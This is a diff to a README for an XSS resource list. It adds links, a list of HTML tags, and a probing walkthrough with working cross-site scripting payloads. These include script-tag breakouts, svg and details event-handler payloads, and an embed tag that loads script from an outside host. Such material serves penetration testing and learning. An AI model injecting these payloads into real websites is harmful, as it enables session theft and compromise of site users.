@@ -12,16 +12,21 @@ Put this repo on watch. I will be updating it regularly.
 ### Awesome People
 - [Rodolfo Assis](https://twitter.com/brutelogic)
 - [Ashar Javed](https://twitter.com/soaj1664ashar)
-- [Somdev Sangwan](https://twitter.com/s0md3v) I own this repo, I can write whatever the fuck I want :v
+- [Somdev Sangwan](https://twitter.com/s0md3v) because I made this repo :3
 
 ### Awesome Reads
 - [XSS in Sarahah](http://www.shawarkhan.com/2017/08/sarahah-xss-exploitation-tool.html)
+- [XSS in Facebook via PNG Content Type](https://whitton.io/articles/xss-on-facebook-via-png-content-types/)
 
 ### Awesome Presentations
 - [How I met your girlfriend](https://www.youtube.com/watch?v=fWk_rMQiDGc)
 - [How to Find 1,352 Wordpress XSS Plugin Vulnerabilities in one hour](https://www.youtube.com/watch?v=9ADubsByGos)
 - [Blind XSS](https://www.youtube.com/watch?v=OT0fJEtz7aE)
 - [Copy Pest](https://www.slideshare.net/x00mario/copypest)
+
+### Awesome Tools
+- [XSStrike](http://xsstrike.tk/)
+- [KNOXSS](http://knoxss.me/)
 
 ### Awesome Context Breaking
 
@@ -54,14 +59,59 @@ Come back later
 Come back later
 
 ### Awesome Tags & Event Handlers
-Come back later
+- [List of all Event Handlers](https://github.com/UltimateHackers/AwesomeXSS/blob/master/Database/event-handlers.md)
 
-### Awesome Methodology
-Come back later
+#### HTML Tags that you will be using
+```
+img
+svg
+body
+html
+embed
+script
+object
+details
+isindex
+iframe
+audio
+video
+```
 
-### Awesome Tools
-- [XSStrike](http://xsstrike.tk/)
-- [KNOXSS](http://knoxss.me/)
+### Awesome Probing
+If nothing of this works, take a look at **Awesome Bypassing** section
+
+First of all, enter a non-malicious string like **d3v** and look at the source code to get an idea about number and contexts of refelections.
+<br>Now for attribute context, check if double quotes (") are being filtered by entering **x"d3v**. If it gets altered to **x&quot;d3v**, chances are that proper security measures are in place. If this happens, try doing the same for single quotes (') by entering **x'd3v**, if it gets altered to **x&apos;**, you are doomed. The only thing you can try is encoding.<br>
+If the quotes are not being filtered, you can simply try payloads from **Awesome Context Breaking** section.
+<br>For javascript context, check which quotes are being used for example if they are doing
+```
+variable = 'value' or variable = "value"
+```
+Now lets say single quotes (') are in use, in that case enter **x'd3v**. If it gets altered to **x\'d3v**, try escaping the backslash (\) by adding a backslash to your probe i.e. **x\'d3v**. If it works use the following payload:
+```
+\'-alert()-\'
+```
+But if it gets altered to **x\\'d3v**, the only thing you can try is closing the script tag itself by using
+```
+</script><svg onload=alert()>
+```
+For simple HTML context, the probe is **x&gt;d3v**. If it gets altered to **x&gt;d3v**, proper sanitization is in place. If it gets reflected as it as, you can enter a dummy tag to check for potenial filters. The dummy tag I like to use is **x&lt;xxx&gt;**. If it gets stripped or altered in any way, it means the filter is looking for a pair of **<** and **>**. It can simply bypassed using
+```
+<svg onload=alert()//
+```
+or this (it will not work in all cases)
+```
+<svg onload=alert()
+```
+If the your dummy tags lands in the source code as it is, go for any of these payloads
+```
+<svg onload=alert()>
+<embed src=//14.rs>
+<details open ontoggle=alert()>
+```
+
+### Awesome Bypassing
+Come back later
 
 ### Awesome Tips & Tricks
 - http:// can be shortened to //
@@ -72,5 +122,6 @@ Come back later
 - The shortest independent payload is **&lt;embed src=//14.rs&gt;** (19 chars)
 
 ## Credits and all that
+Help me buy a new laptop:
 All the payloads are crafted by me unless specified.
 Thanks to my big brother [Rodolfo Assis](https://twitter.com/brutelogic) whose writings inspired me to become an XSSLord.
